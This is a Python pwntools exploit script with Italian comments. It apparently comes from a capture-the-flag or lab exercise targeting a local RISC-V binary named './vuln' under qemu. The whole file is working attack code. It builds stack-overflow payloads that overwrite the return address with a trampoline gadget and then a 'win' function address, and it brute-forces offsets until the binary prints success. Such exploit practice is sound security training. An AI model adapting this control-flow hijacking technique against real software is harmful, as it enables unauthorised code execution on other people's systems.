from pwn import *
import sys

# Disabilita i log inutili di pwntools
context.log_level = 'critical' 
context.arch = 'riscv64'

# Configurazioni
BINARY = './vuln'
elf = ELF(BINARY)

# Dati LCSAJ
TRAMPOLINE = 0x11bc0
WIN_ADDR = elf.symbols['win']

print(f"[*] Avvio Double Fuzzer...")
print(f"[*] Trampolino: {hex(TRAMPOLINE)}")
print(f"[*] Win Target: {hex(WIN_ADDR)}")
print("[*] Premi Ctrl+C per interrompere.\n")

# RANGE DI RICERCA
# Offset RA: proviamo da 64 a 128 byte (tipici stack frame)
# Padding Trampolino: proviamo da 0 a 150 byte
possible_ra_offsets = range(64, 128, 8) 
possible_trampoline_pads = range(0, 160, 8)

for ra_off in possible_ra_offsets:
    print(f"Testing RA Offset: {ra_off}...", end='\r')
    
    for tram_pad in possible_trampoline_pads:
        try:
            # 1. Costruzione Payload
            # Padding iniziale + Indirizzo Trampolino
            payload = b"A" * ra_off
            payload += p64(TRAMPOLINE)
            
            # Padding Trampolino + Indirizzo Win
            payload += b"B" * tram_pad
            payload += p64(WIN_ADDR)
            
            # 2. Lancio Processo
            # Se hai compilato statico, -L non serve, ma lo lasciamo per sicurezza
            p = process(['qemu-riscv64', './vuln'])
            
            p.sendline(payload)
            
            # Leggiamo tutto
            output = p.recvall(timeout=0.1).decode()
            p.close()
            
            # 3. Check Successo
            if "EXPLOIT SUCCESS" in output:
                print(f"\n\n[!!!] JACKPOT TROVATO! [!!!]")
                print(f"-------------------------------------------")
                print(f"OFFSET_RA (Padding Iniziale):  {ra_off}")
                print(f"TRAMPOLINE_PAD (Buco Stack):   {tram_pad}")
                print(f"-------------------------------------------")
                print(f"Output del binario:\n{output.strip()}")
                sys.exit(0)
                
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

print("\n\n[!] Nessuna combinazione trovata. C'è qualcosa di strano nel binario o negli indirizzi.")
